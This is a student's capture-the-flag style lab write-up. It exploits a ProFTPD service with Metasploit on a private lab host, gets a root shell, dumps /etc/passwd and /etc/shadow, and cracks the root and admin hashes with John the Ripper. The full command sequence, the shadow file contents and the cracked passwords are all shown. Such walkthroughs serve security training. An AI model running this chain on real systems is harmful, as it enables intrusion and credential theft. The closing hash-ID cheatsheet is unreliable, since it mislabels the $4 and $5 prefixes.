# Steps for lab 3

## Step 1 - Get into target machine

### Step 1.1 - Use msfconsole

```bash
msfconsole
```

### Step 1.2 - Use ProFTPD

```bash
search ProFTPD
use 5
```

### Step 1.3 - Set RHOST and payload

```bash
set RHOSTS 10.5.0.254
run
set payload 5
set LHOST 10.5.0.1
run
```

### Step 1.4 - Check username

```bash
whoami
```

```bash
root
```

### Step 1.5 - Copy the /etc/passwd and /etc/shadow

```bash
cat /etc/passwd
```

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/bash
```

```bash
cat /etc/shadow
```

```bash
root:$y$j9T$GWXWlbPiR.YBznBxQpS301$hVa4gidXVcFH/0m.rL1aW1VEqkVqic/E.lRj.wJBOeD:19268:0:99999:7:::
daemon:*:19247:0:99999:7:::
bin:*:19247:0:99999:7:::
sys:*:19247:0:99999:7:::
sync:*:19247:0:99999:7:::
games:*:19247:0:99999:7:::
man:*:19247:0:99999:7:::
lp:*:19247:0:99999:7:::
mail:*:19247:0:99999:7:::
news:*:19247:0:99999:7:::
uucp:*:19247:0:99999:7:::
proxy:*:19247:0:99999:7:::
www-data:*:19247:0:99999:7:::
backup:*:19247:0:99999:7:::
list:*:19247:0:99999:7:::
irc:*:19247:0:99999:7:::
gnats:*:19247:0:99999:7:::
nobody:*:19247:0:99999:7:::
_apt:*:19247:0:99999:7:::
systemd-network:*:19268:0:99999:7:::
systemd-resolve:*:19268:0:99999:7:::
messagebus:*:19268:0:99999:7:::
systemd-timesync:*:19268:0:99999:7:::
sshd:*:19268:0:99999:7:::
admin:$y$j9T$Yaz43eoUN1NuXP7TFkdfK.$Xq1oDzJ8GsDNaMc/qSk1DacGMqIsTRdP3MjhQQQdZ35:19268:0:99999:7:::
```

## Step 2 - Cracking password

### Step 2.1 - Paste the /etc/passwd and /etc/shadow

```bash
touch passwd.txt
nano passwd.txt
touch shadow.txt
nano shadow.txt
```

### Step 2.2 Use unshadow

```bash
unshadow passwd.txt shadow.txt > crack.db
cat crack.db
```

```bash
root:$y$j9T$GWXWlbPiR.YBznBxQpS301$hVa4gidXVcFH/0m.rL1aW1VEqkVqic/E.lRj.wJBOeD:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:*:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:*:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:*:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:*:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:*:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:*:105:65534::/run/sshd:/usr/sbin/nologin
admin:$y$j9T$Yaz43eoUN1NuXP7TFkdfK.$Xq1oDzJ8GsDNaMc/qSk1DacGMqIsTRdP3MjhQQQdZ35:1000:1000::/home/admin:/bin/bash
```

### Step 2.3 Use john with --format=crypt as the method was $y$

- [Hash-formats cheatsheet](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)

```bash
john crack.db --format=crypt
```

```bash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
toor             (root)
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
secret           (admin)
2g 0:00:00:18 DONE 2/3 (2023-04-03 02:55) 0.1079g/s 60.42p/s 60.47c/s 60.47C/s 123456..pepper
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Step 2.4 Show the cracked password

```bash
john -show crack.db
```

```bash
root:toor:0:0:root:/root:/bin/bash
admin:secret:1000:1000::/home/admin:/bin/bash
```

- The password for root user: toor
- The password for admin user: secret

## Password hash cheatsheet

1. Format

    ```bash
    $id$salt$hashed
    ```

2. ID table

    ```bash
    $1 - MD5
    $2a - Blowfish
    $4 - SHA256
    $5 - SHA512
    $7 - Yescrypt
    $y - Yescrypt
    ```

## Terminal output

- [tmux session 1](tmux1.txt)

- [tmux session 2](tmux2.txt)
